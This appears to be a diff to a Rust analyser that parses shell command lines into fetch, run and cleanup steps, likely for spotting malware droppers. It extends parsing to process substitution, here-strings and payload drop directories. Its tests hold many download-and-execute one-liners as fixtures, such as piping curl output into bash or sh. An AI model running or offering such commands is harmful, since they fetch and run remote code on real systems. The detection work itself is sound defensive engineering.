@@ -46,6 +46,21 @@ const SYSTEM_DIRS: [&[u8]; 7] = [
     b"/bin/", b"/sbin/", b"/usr/", b"/etc/", b"/lib/", b"/proc/", b"/sys/",
 ];
 
+/// Where a payload is dropped when its path has no `.` to show for itself.
+const DROP_DIRS: [&[u8]; 8] = [
+    b"/tmp/",
+    b"/var/",
+    b"/dev/shm/",
+    b"/root/",
+    b"/home/",
+    b"/mnt/",
+    b"/opt/",
+    b"/run/",
+];
+
+/// Longest path taken for a payload.
+const MAX_PATH: usize = 128;
+
 /// Short options that take a value, per tool, as one byte each; then the
 /// ones among them naming the local file.
 const WGET_VALUES: (&[u8], &[u8]) = (b"aABDeIilOoPQRtTUwX", b"O");
@@ -142,11 +157,17 @@ impl Word {
             return None;
         };
         let opener = match self.text.as_slice() {
-            [b'$', b'(', ..] => 2,
+            [b'$' | b'<', b'(', ..] => 2,
             [b'`', ..] => 1,
             _ => return None,
         };
         (self.text.len() <= opener + (end - start) + 1).then_some((start, end))
+    }
+
+    /// The range inside, when the word is `<(…)`, which reads as a file.
+    fn process_substitution(&self) -> Option<(usize, usize)> {
+        self.only_substitution()
+            .filter(|_| self.text.starts_with(b"<("))
     }
 }
 
@@ -165,6 +186,8 @@ enum Op {
 enum Redir {
     /// Standard output to the next word.
     Out,
+    /// Standard input from the next word, or with `string` being that word.
+    Stdin { string: bool },
     /// A heredoc, with the next word as its end line.
     Here { strip_tabs: bool },
     /// Anything else; the next word is not an argument.
@@ -285,6 +308,7 @@ impl<'a> Lexer<'a> {
                 (b'|', _) => (1, Tok::Op(Op::Pipe)),
                 (b'(', _) => (1, Tok::Op(Op::Open)),
                 (b')', _) => (1, Tok::Op(Op::Close)),
+                (b'<', Some(b'(')) => return self.process_substitution(),
                 (b'<' | b'>', _) => return self.redirect(None),
                 _ => return self.word_or_fd(),
             };
@@ -292,6 +316,22 @@ impl<'a> Lexer<'a> {
             self.joined = matches!(tok, Tok::Op(Op::And | Op::Or | Op::Pipe));
             return tok;
         }
+    }
+
+    /// `<(…)`: a word of its own, opened like `$(…)`.
+    fn process_substitution(&mut self) -> Tok {
+        let start = self.at;
+        let close = closing_paren(self.text, start + 2);
+        self.subs.push((start + 2, close));
+        self.at = (close + 1).min(self.text.len());
+        Tok::Word(Word {
+            start,
+            end: self.at,
+            inner: (start, self.at),
+            text: self.text[start..self.at].to_vec(),
+            dynamic: true,
+            ..Word::default()
+        })
     }
 
     fn word_or_fd(&mut self) -> Tok {
@@ -306,16 +346,18 @@ impl<'a> Lexer<'a> {
 
     fn redirect(&mut self, fd: Option<&[u8]>) -> Tok {
         let (len, redir) = match &self.text[self.at..] {
-            [b'<', b'<', b'<', ..] => (3, Redir::Skip),
+            [b'<', b'<', b'<', ..] => (3, Redir::Stdin { string: true }),
             [b'<', b'<', b'-', ..] => (3, Redir::Here { strip_tabs: true }),
             [b'<', b'<', ..] => (2, Redir::Here { strip_tabs: false }),
             [b'<', b'&' | b'>', ..] | [b'>', b'&', ..] => (2, Redir::Skip),
-            [b'<', ..] => (1, Redir::Skip),
+            [b'<', ..] => (1, Redir::Stdin { string: false }),
             [b'>', b'>' | b'|', ..] => (2, Redir::Out),
             _ => (1, Redir::Out),
         };
         self.at += len;
-        let elsewhere = redir == Redir::Out && fd.is_some_and(|fd| fd != b"1");
+        let own: &[u8] = if redir == Redir::Out { b"1" } else { b"0" };
+        let elsewhere =
+            matches!(redir, Redir::Out | Redir::Stdin { .. }) && fd.is_some_and(|fd| fd != own);
         Tok::Redir(if elsewhere { Redir::Skip } else { redir })
     }
 
@@ -550,11 +592,17 @@ fn is_assignment(word: &Word) -> bool {
             .all(|&b| b.is_ascii_alphanumeric() || b == b'_')
 }
 
-/// A path a payload could be at; `/usr/bin/id` is the system's.
+/// A path a payload could be at; `/usr/bin/id` is the system's. A line of
+/// base64 starts with `/` often enough, so a path has to look like one: a
+/// `.` or a directory payloads are dropped in, and no base64 padding or `+`.
 fn is_payload_path(path: &[u8]) -> bool {
     let relative: [&[u8]; 4] = [b"/", b"./", b"../", b"~/"];
+    let path_bytes = |b: &u8| b.is_ascii_alphanumeric() || b"._~/-".contains(b);
     relative.iter().any(|p| path.starts_with(p))
         && !SYSTEM_DIRS.iter().any(|dir| path.starts_with(dir))
+        && path.len() <= MAX_PATH
+        && path.iter().all(path_bytes)
+        && (path.contains(&b'.') || DROP_DIRS.iter().any(|dir| path.starts_with(dir)))
         && path.split(|&b| b == b'/').all(|p| p.len() <= MAX_NAME)
 }
 
@@ -747,14 +795,14 @@ struct Frame {
     stages: List,
     /// A `|` was passed in this pipeline.
     piped: bool,
-    /// `Reader::files` holds this pipeline's fetches from here on.
-    pipe_start: usize,
+    /// Where this pipeline starts.
+    pipe_start: Mark,
     /// An `if`'s condition and `then` arm.
     first: List,
 }
 
 impl Frame {
-    fn new(kind: Kind, pipe_start: usize) -> Frame {
+    fn new(kind: Kind, pipe_start: Mark) -> Frame {
         Frame {
             kind,
             list: List::default(),
@@ -777,7 +825,7 @@ impl Frame {
             .max(self.first.height)
     }
 
-    fn end_pipeline(&mut self, files: usize) {
+    fn end_pipeline(&mut self, mark: Mark) {
         let stages = take(&mut self.stages);
         if stages.nodes.len() > 1 {
             self.cur.push(Node::Pipe(stages.nodes), stages.height + 1);
@@ -785,7 +833,7 @@ impl Frame {
             self.cur.append(stages);
         }
         self.piped = false;
-        self.pipe_start = files;
+        self.pipe_start = mark;
     }
 
     fn end_or(&mut self) {
@@ -794,20 +842,27 @@ impl Frame {
         }
     }
 
-    fn end_list(&mut self, files: usize) {
-        self.end_pipeline(files);
+    fn end_list(&mut self, mark: Mark) {
+        self.end_pipeline(mark);
         self.end_or();
         let cur = take(&mut self.cur);
         self.list.append(cur);
     }
 
-    fn or(&mut self, files: usize) {
-        self.end_pipeline(files);
+    fn or(&mut self, mark: Mark) {
+        self.end_pipeline(mark);
         self.end_or();
         if !self.cur.nodes.is_empty() {
             self.left = Some(take(&mut self.cur));
         }
     }
+}
+
+/// How much of `Reader::files` and `Reader::fed` came before a pipeline.
+#[derive(Debug, Clone, Copy, Default)]
+struct Mark {
+    files: usize,
+    fed: usize,
 }
 
 /// A file a step put on disk, and the fetch behind it if there is one.
@@ -822,6 +877,8 @@ struct File {
 struct Command {
     words: Vec<Word>,
     out: Option<Word>,
+    /// The word on standard input, and whether it is that input itself.
+    stdin: Option<(Word, bool)>,
     body: Option<(usize, usize)>,
 }
 
@@ -839,6 +896,8 @@ struct Reader<'a> {
     cmd: Command,
     redir: Option<Redir>,
     files: Vec<File>,
+    /// Substitutions in what `echo`, `printf` and `cat` print.
+    fed: Vec<(usize, usize)>,
     stopped: bool,
     /// A substitution was refused.
     sealed: bool,
@@ -849,6 +908,13 @@ struct Reader<'a> {
 impl Reader<'_> {
     fn top(&mut self) -> &mut Frame {
         self.frames.last_mut().unwrap_or(&mut self.root)
+    }
+
+    fn mark(&self) -> Mark {
+        Mark {
+            files: self.files.len(),
+            fed: self.fed.len(),
+        }
     }
 
     /// Stop here, and say why.
@@ -888,8 +954,8 @@ impl Reader<'_> {
         while let Some(frame) = self.frames.pop() {
             self.close(frame);
         }
-        let files = self.files.len();
-        self.root.end_list(files);
+        let mark = self.mark();
+        self.root.end_list(mark);
         take(&mut self.root.list)
     }
 
@@ -953,6 +1019,7 @@ impl Reader<'_> {
     fn word(&mut self, word: Word) {
         match self.redir.take() {
             Some(Redir::Out) if is_file(&word.text) => self.cmd.out = Some(word),
+            Some(Redir::Stdin { string }) => self.cmd.stdin = Some((word, string)),
             Some(Redir::Here { strip_tabs }) => self.lex.heredoc = Some((word.text, strip_tabs)),
             Some(_) => {}
             None => {
@@ -976,7 +1043,7 @@ impl Reader<'_> {
     }
 
     fn keyword(&mut self, word: &[u8]) -> bool {
-        let files = self.files.len();
+        let mark = self.mark();
         match word {
             b"if" => self.open_frame(Kind::If {
                 arm: Arm::Cond,
@@ -989,7 +1056,7 @@ impl Reader<'_> {
                     && *arm == Arm::Cond
                 {
                     *arm = Arm::Then;
-                    top.end_list(files);
+                    top.end_list(mark);
                     top.first = take(&mut top.list);
                 }
             }
@@ -1026,13 +1093,13 @@ impl Reader<'_> {
     }
 
     fn to_else(&mut self) {
-        let files = self.files.len();
+        let mark = self.mark();
         let top = self.top();
         if let Kind::If { arm, .. } = &mut top.kind
             && *arm != Arm::Else
         {
             *arm = Arm::Else;
-            top.end_list(files);
+            top.end_list(mark);
             let then = take(&mut top.list);
             top.first.append(then);
         }
@@ -1042,7 +1109,8 @@ impl Reader<'_> {
         if self.frames.len() >= MAX_NEST {
             return self.over(OpaqueReason::TooDeep);
         }
-        self.frames.push(Frame::new(kind, self.files.len()));
+        let mark = self.mark();
+        self.frames.push(Frame::new(kind, mark));
     }
 
     fn close_group(&mut self) {
@@ -1055,7 +1123,7 @@ impl Reader<'_> {
 
     /// Hand a finished group to the frame below, as a stage of its pipeline.
     fn close(&mut self, mut frame: Frame) {
-        frame.end_list(self.files.len());
+        frame.end_list(self.mark());
         let nodes = match frame.kind {
             Kind::If { arm, status, .. } => {
                 let (mut first, fallback) = if arm == Arm::Else {
@@ -1083,11 +1151,11 @@ impl Reader<'_> {
     fn op(&mut self, op: Op) {
         self.redir = None;
         self.end_command();
-        let files = self.files.len();
+        let mark = self.mark();
         match op {
-            Op::Sep => self.top().end_list(files),
-            Op::And => self.top().end_pipeline(files),
-            Op::Or => self.top().or(files),
+            Op::Sep => self.top().end_list(mark),
+            Op::And => self.top().end_pipeline(mark),
+            Op::Or => self.top().or(mark),
             Op::Pipe => self.top().piped = true,
             Op::Open => self.open_frame(Kind::Group),
             Op::Close => self.close_group(),
@@ -1157,9 +1225,18 @@ impl Reader<'_> {
     }
 
     fn save_pipeline(&mut self) {
-        let from = self.top().pipe_start;
+        let from = self.top().pipe_start.files;
         for file in self.files.iter_mut().skip(from) {
             file.saved = true;
+        }
+    }
+
+    /// A shell reads this pipeline: what it fetched, and what it printed.
+    fn pipeline_is_run(&mut self) {
+        self.save_pipeline();
+        let from = self.top().pipe_start.fed.min(self.fed.len());
+        for sub in self.fed.split_off(from) {
+            self.output_is_run(sub);
         }
     }
 
@@ -1177,11 +1254,6 @@ impl Reader<'_> {
 
     fn command(&mut self, head: &Word, args: &[Word], cmd: &Command) {
         let name = base(&head.text);
-        let body = cmd.body.map(|(start, end)| Span {
-            layer: self.layer,
-            start,
-            end,
-        });
         let out = cmd.out.as_ref();
         if let Some(sub) = head.only_substitution() {
             self.output_is_run(sub);
@@ -1189,10 +1261,16 @@ impl Reader<'_> {
         if is_payload_path(&head.text) {
             return self.run_binary(head, args);
         }
+        if matches!(name, b"echo" | b"printf" | b"cat") {
+            let subs = args.iter().flat_map(|w| w.subs.iter().copied());
+            self.fed.extend(subs);
+        }
         match name {
             b"cd" | b"pushd" | b"mkdir" | b"export" | b"umask" | b"ulimit" | b"unset" | b"set" => {
                 self.emit(Step::Prepare(plain_name(name)));
             }
+            // On purpose not one step: `chmod 600` readies a key and `chmod
+            // 777` arms a payload, so the recipes differ in `normal` too.
             b"chmod" => {
                 let mode = args.iter().find(|w| !w.text.starts_with(b"-R"));
                 if mode.is_some_and(|w| is_exec_mode(&w.text)) {
@@ -1216,7 +1294,14 @@ impl Reader<'_> {
                 let data = self.literal(args);
                 self.write(data, out);
             }
-            b"cat" | b"base64" | b"xxd" if out.is_some() => self.write(body, out),
+            b"cat" | b"base64" | b"xxd" if out.is_some() => {
+                let body = cmd.body.map(|(start, end)| Span {
+                    layer: self.layer,
+                    start,
+                    end,
+                });
+                self.write(body, out);
+            }
             b"tee" => {
                 let file = args.iter().find(|w| !w.text.starts_with(b"-"));
                 self.write(None, file);
@@ -1234,10 +1319,10 @@ impl Reader<'_> {
                     Step::Other(plain_name(name))
                 });
             }
-            _ if SHELLS.contains(&name) => self.run_interpreter(name, b"c", true, body, args),
+            _ if SHELLS.contains(&name) => self.run_interpreter(name, b"c", true, cmd, args),
             _ => {
                 if let Some((_, inline)) = INTERPRETERS.iter().find(|(n, _)| *n == name) {
-                    self.run_interpreter(name, inline, false, None, args);
+                    self.run_interpreter(name, inline, false, cmd, args);
                 } else if self.is_dropped(name) {
                     self.run_binary(head, args);
                 } else {
@@ -1300,14 +1385,13 @@ impl Reader<'_> {
 
     /// A shell or interpreter: `sh -s <tag>` reads its input, `sh <file>
     /// <tag>` runs the file, and `sh -c …` carries its code as an argument.
-    /// A heredoc to a shell is read as shell, with `body` the one that came
-    /// with this command, if it did.
+    /// A heredoc to a shell is read as shell.
     fn run_interpreter(
         &mut self,
         name: &[u8],
         inline: &[u8],
         shell: bool,
-        body: Option<Span>,
+        cmd: &Command,
         args: &[Word],
     ) {
         let mut rest = args;
@@ -1323,12 +1407,16 @@ impl Reader<'_> {
             if text.len() < 2 || !matches!(text[0], b'-' | b'+') {
                 break;
             }
+            rest = more;
             if !text.starts_with(b"--") {
                 let flags = &text[1..];
                 reads_input |= shell && flags.contains(&b's');
                 has_code |= flags.iter().any(|f| inline.contains(f));
+                // `-o pipefail`, `-eo pipefail`, `+o history`.
+                if shell && flags.ends_with(b"o") {
+                    rest = rest.get(1..).unwrap_or_default();
+                }
             }
-            rest = more;
         }
         let what = if has_code || reads_input {
             None
@@ -1337,7 +1425,8 @@ impl Reader<'_> {
         };
         let piped = self.top().piped;
         let file_like = what.is_some_and(|f| f.url_like() || self.is_dropped(base(&f.text)));
-        if !shell && !has_code && !piped && !file_like {
+        let stdin = cmd.stdin.as_ref().filter(|_| what.is_none() && !has_code);
+        if !shell && !has_code && !piped && !file_like && stdin.is_none() {
             return self.emit(Step::Other(plain_name(name)));
         }
         if has_code {
@@ -1346,19 +1435,40 @@ impl Reader<'_> {
             }
             rest = &[];
         } else if shell && what.is_none() {
-            self.heredoc_runs = body.is_some() || self.lex.heredoc.is_some();
+            self.heredoc_runs = cmd.body.is_some() || self.lex.heredoc.is_some();
         }
-        if let Some(file) = what {
-            rest = &rest[1..];
+        if let Some((word, string)) = stdin {
+            self.stdin_is_code(word, *string, shell || matches!(name, b"." | b"source"));
+        }
+        let process = what.and_then(Word::process_substitution);
+        if let Some(sub) = process {
+            self.output_is_run(sub);
+        } else if let Some(file) = what {
             self.ran(base(&file.text));
         } else if piped {
-            self.save_pipeline();
+            self.pipeline_is_run();
         }
-        let what = what.map_or(name, |file| file.text.as_slice());
+        if what.is_some() {
+            rest = &rest[1..];
+        }
+        let what = what
+            .filter(|_| process.is_none())
+            .map_or(name, |file| file.text.as_slice());
         let what = self.keep(what);
         let tag = self.tag(rest.last());
         if let Some(what) = what {
             self.emit(Step::Run { what, tag });
+        }
+    }
+
+    /// `sh <<< "$(…)"`, `sh < <(…)`, `sh <<< 'code'`, `sh < file`.
+    fn stdin_is_code(&mut self, word: &Word, string: bool, reads_shell: bool) {
+        if let Some(sub) = word.only_substitution() {
+            self.output_is_run(sub);
+        } else if !string {
+            self.ran(base(&word.text));
+        } else if reads_shell {
+            self.open_script(std::slice::from_ref(word));
         }
     }
 
@@ -1397,14 +1507,21 @@ impl Reader<'_> {
         for source in sources.iter().filter(|w| w.url_like()) {
             any = true;
             let target = source.span(self.layer);
-            if target.end - target.start > MAX_VALUE {
-                return self.over(OpaqueReason::OverLimit);
-            }
             let local = local
                 .map(base)
                 .filter(|name| !matches!(*name, b"" | b"."))
                 .or(url_named.then(|| url_name(&source.text)));
             let name = redirect.map_or(local, |file| Some(base(&file.text)));
+            // One URL too long to keep is no reason to stop reading.
+            if target.end - target.start > MAX_VALUE {
+                push_opaque(self.xray, target, OpaqueReason::OverLimit);
+                self.files.push(File {
+                    target: None,
+                    name: name.map(<[u8]>::to_vec),
+                    saved: false,
+                });
+                continue;
+            }
             self.emit(Step::Fetch {
                 tool: tool.to_string(),
                 target,
@@ -1533,11 +1650,12 @@ fn read_layer(
         layer,
         text,
         lex: Lexer::new(text),
-        root: Frame::new(Kind::Root, 0),
+        root: Frame::new(Kind::Root, Mark::default()),
         frames: Vec::new(),
         cmd: Command::default(),
         redir: None,
         files: Vec::new(),
+        fed: Vec::new(),
         stopped: false,
         sealed: false,
         heredoc_runs: false,
@@ -1961,8 +2079,7 @@ mod tests {
         let long = "a".repeat(MAX_VALUE + 1);
         for line in [
             format!("rm -f a; ./x {long}; rm x"),
-            format!("rm -f a; /tmp{} tag; rm x", "/a".repeat(MAX_VALUE / 2 + 1)),
-            format!("rm -f a; ./x tag; wget http://example.org/{long}; rm x"),
+            format!("rm -f a; echo a > {long}; {long} tag; rm x"),
             format!(
                 "rm -f a; ./x tag; echo {}; rm x",
                 "a ".repeat(MAX_PIECES + 1)
@@ -1974,6 +2091,25 @@ mod tests {
             assert_eq!(*found[0], Step::Wipe);
             assert!(!found.contains(&&Step::Cleanup), "{line}");
         }
+    }
+
+    #[test]
+    fn a_target_over_the_limit_is_dropped_and_reading_goes_on() {
+        let long = format!("http://example.org/{}", "a".repeat(MAX_VALUE));
+        let x = read(&format!(
+            "cd /tmp; wget {long} -O /tmp/a; /tmp/a tag; wget http://example.org/b; rm x"
+        ));
+        assert_eq!(x.opaque.len(), 1);
+        assert!(over_limit(&x));
+        assert_eq!(x.opaque[0].at.layer, 0);
+        let found = steps(&only(&x).nodes);
+        assert_eq!(found.len(), 4, "{found:?}");
+        assert_eq!(*found[1], run("/tmp/a", Some("tag")));
+        assert_eq!(fetch(&x, found[2]).1, "http://example.org/b");
+        assert_eq!(*found[3], Step::Cleanup);
+        // The other URL of the same command is kept.
+        let x = read(&format!("wget {long} http://example.org/b"));
+        assert_eq!(steps(&only(&x).nodes).len(), 1);
     }
 
     #[test]
@@ -2338,6 +2474,10 @@ mod tests {
             "nohup sh -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag' &",
             "eval 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
             "eval \"wget http://example.org/a -O /tmp/a; sh /tmp/a tag\"",
+            "bash -o pipefail -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "sh -e -o x -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "bash -eo pipefail -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
+            "bash +o history -c 'wget http://example.org/a -O /tmp/a; sh /tmp/a tag'",
         ] {
             let x = read(line);
             assert_eq!(shell_layers(&x), [SCRIPT], "{line}");
@@ -2394,6 +2534,21 @@ mod tests {
             // Not the whole script, but in command position.
             "sh -c \"cd /tmp; $(curl -s http://example.org/x)\"",
             "sh -c \"$(curl -s http://example.org/x) arg\"",
+            // Process substitution and here-strings.
+            "bash <(curl -s http://example.org/x)",
+            ". <(wget -qO- http://example.org/x)",
+            "source <(curl -s http://example.org/x)",
+            "sh < <(curl -s http://example.org/x)",
+            "sh <<< \"$(curl -s http://example.org/x)\"",
+            "bash <<< `curl -s http://example.org/x`",
+            "source <<< \"$(curl -s http://example.org/x)\"",
+            // Printed into a shell.
+            "echo $(curl -s http://example.org/x) | sh",
+            "printf '%s' \"$(curl -s http://example.org/x)\" | sh",
+            "echo \"$(curl -s http://example.org/x)\" | base64 -d | bash",
+            "cat <(curl -s http://example.org/x) | sh",
+            "(echo $(curl -s http://example.org/x)) | sh",
+            "{ echo a; echo $(curl -s http://example.org/x); } | python3",
         ] {
             assert_eq!(all_saved(&read(line)), [true], "{line}");
         }
@@ -2417,9 +2572,44 @@ mod tests {
             "a=$(curl -s http://example.org/x)",
             "sh -c \"echo $(curl -s http://example.org/x)\"",
             "eval \"echo $(curl -s http://example.org/x)\"",
+            "cat <(curl -s http://example.org/x)",
+            "echo $(curl -s http://example.org/x) | grep a",
+            "echo $(curl -s http://example.org/x); sh",
+            "echo $(curl -s http://example.org/x) | sh /tmp/a",
+            "echo $(curl -s http://example.org/x) && a | sh",
+            "sh /tmp/a <<< \"$(curl -s http://example.org/x)\"",
+            "grep a <<< \"$(curl -s http://example.org/x)\"",
         ] {
             assert_eq!(all_saved(&read(line)), [false], "{line}");
         }
+    }
+
+    #[test]
+    fn stdin_of_a_shell_is_code() {
+        let x = read("bash <(curl -s http://example.org/x) apache");
+        let parent = steps(&x.recipes[0].nodes);
+        assert_eq!(parent, [&run("bash", Some("apache"))]);
+        // A here-string holds the code itself, and only shells read it so.
+        let x = read("sh <<< 'wget -qO- http://example.org/x | sh'");
+        assert_eq!(
+            shell_layers(&x),
+            [&b"wget -qO- http://example.org/x | sh"[..]]
+        );
+        assert_eq!(all_saved(&x), [true]);
+        assert_eq!(
+            shell_layers(&read("python3 <<< 'wget http://example.org/x'")),
+            [&[] as &[u8]; 0]
+        );
+        // A file on stdin is a run of that file.
+        assert_eq!(
+            all_saved(&read("wget http://example.org/x; sh < x")),
+            [true]
+        );
+        // Only stdin counts: not another descriptor.
+        assert_eq!(
+            all_saved(&read("wget http://example.org/x; sh 3< x")),
+            [false]
+        );
     }
 
     #[test]
@@ -2498,13 +2688,14 @@ mod tests {
         let line = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
         let slash = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt";
         let split = "/tmp/3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt";
+        let parts = "/3BlbnNzaC1rZXktdjEAAAAABG5vbmUA/AAAEbm9uZQAAAAAAAAABAAAAMwAAAAt";
         for body in [
             // Written by a heredoc inside the heredoc.
             format!("cat > /tmp/k <<K\n{slash}\n{line}\nK\nscp -i /tmp/k u@example.org:/a a\n"),
             // A pasted block: reading stops at the marker.
             format!("./x t\n-----BEGIN OPENSSH PRIVATE KEY-----\n{slash}\n{line}\n"),
             // Lines with no marker at all are no commands to keep.
-            format!("./x t\n{slash}\n{line}\n{split}\n"),
+            format!("./x t\n{slash}\n{line}\n{split}\n{parts}\n"),
             // Quoted, it is only a span.
             format!("echo \"{slash}\" >> /tmp/k; echo \"{line}\" >> /tmp/k; sh /tmp/k\n"),
         ] {
@@ -2512,7 +2703,7 @@ mod tests {
                 let x = read(&wrapped);
                 assert!(!x.recipes.is_empty(), "{wrapped}");
                 let kept = format!("{:?}", x.recipes);
-                for key in [line, slash, split] {
+                for key in [line, slash, split, parts] {
                     assert!(!kept.contains(key), "{wrapped}");
                 }
             }
@@ -2525,6 +2716,44 @@ mod tests {
         let found = steps(&only(&x).nodes);
         assert_eq!(*found[2], run("./sh", Some("tag")));
         assert_eq!(fetches_saved(&x), [true]);
+    }
+
+    #[test]
+    fn payload_paths_look_like_paths() {
+        for path in [
+            "/tmp/x",
+            "/var/tmp/x",
+            "/dev/shm/x",
+            "/root/x",
+            "/home/a/x",
+            "/mnt/x",
+            "/opt/x",
+            "/run/x",
+            "./x",
+            "../x",
+            "/data/x.sh",
+            "/tmp/out_sh",
+            "./out_sh",
+            "~/.x",
+        ] {
+            assert_eq!(
+                steps(&only(&read(path)).nodes),
+                [&run(path, None)],
+                "{path}"
+            );
+        }
+        let long = format!("/tmp/{}", "a/".repeat(70));
+        for path in [
+            "/data/x",
+            "/tmpx/y",
+            "~/x",
+            "/usr/bin/id",
+            "/tmp/a+b",
+            "/tmp/a=",
+            long.as_str(),
+        ] {
+            assert_eq!(read(path).recipes, [], "{path}");
+        }
     }
 
     #[test]
